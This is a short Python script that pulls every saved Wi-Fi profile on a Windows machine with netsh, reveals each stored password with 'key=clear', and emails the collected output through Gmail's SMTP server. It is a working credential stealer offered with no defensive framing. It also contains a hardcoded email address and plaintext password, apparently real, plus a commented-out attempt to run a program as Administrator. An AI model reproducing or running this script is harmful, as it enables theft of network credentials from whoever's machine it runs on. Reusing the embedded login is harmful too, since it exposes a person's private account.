import subprocess , smtplib, re

command1="netsh wlan show profile"
child = subprocess.Popen(command1, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
retValRunJobsSerialScript = 0
outputString=""
for line in child.stdout.readlines():
        child.wait()
        outputString+=line.decode('utf-8')
retValRunJobsSerialScript= child.returncode
print(outputString)
''''
prog = subprocess.Popen(['runas', '/noprofile', '/user:Administrator', 'NeedsAdminPrivilege.exe'],stdin=subprocess.PIPE)
prog.communicate()
networks=subprocess.check_output(command1,shell=True)
print(networks.decode("utf-8"))

network_str=networks.decode("utf-8")
'''
network_list=re.findall('(?:Profile\s*:\s)(.*)'  ,outputString)
print(network_list)
final_output=""
for  network in network_list:
        command2="netsh wlan show profile" +" "+ f'"{network}"'+" "+"key=clear"
        print(command2)
        child = subprocess.Popen(command2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        retValRunJobsSerialScript= 0
        outputString=""
        for line in child.stdout.readlines():
                child.wait()
                outputString+=line.decode('utf-8')
        retValRunJobsSerialScript= child.returncode
        print(outputString)
        final_output+=outputString
	


server=smtplib.SMTP("smtp.gmail.com",587)
server.starttls()
email="rajeevupadhyay608@gmail.com"
password="mernstack8800"
server.login(email,password)
server.sendmail(email,email,final_output)
server.quit()


